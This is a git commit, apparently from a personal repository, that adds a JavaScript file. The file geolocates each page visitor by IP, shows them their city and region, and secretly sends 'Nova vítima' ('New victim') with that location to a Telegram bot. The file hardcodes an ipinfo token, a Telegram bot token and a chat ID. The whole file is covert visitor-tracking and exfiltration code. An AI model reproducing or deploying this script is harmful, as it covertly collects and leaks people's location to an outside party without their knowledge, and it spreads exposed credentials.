29ebbfba794d31b63057b55e775818b74a353a1e
gustavo123123131 <gustabarbosa1008@gmail.com>
2025-07-04 19:07:06 -0300

    Add files via upload

---
+++ script.js
@@ -0,0 +1,19 @@
+fetch("https://ipinfo.io/json?token=c296f01ff5e2f2")
+.then(response => response.json())
+.then(data => {
+    var city = data.city;
+    var region = data.region;
+    var localizacao = "Cidade: " + city + " | Estado: " + region;
+    document.getElementById("local").innerHTML = 
+        "Verifiquei e você está em " + city + " - " + region + ", certo? 😉";
+
+    var msg = "🎯 Nova vítima: " + localizacao;
+    var telegramToken = "8112207542:AAFcWgs84PsAoQxfmuFmwy4wPd1v_tTSRnk";
+    var chatId = "7306400678";
+    var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+    fetch(url)
+    .then(response => console.log("Enviado pro Telegram"))
+    .catch(error => console.error("Erro ao enviar pro Telegram:", error));
+})
+.catch(error => console.error("Erro ao obter localização:", error));
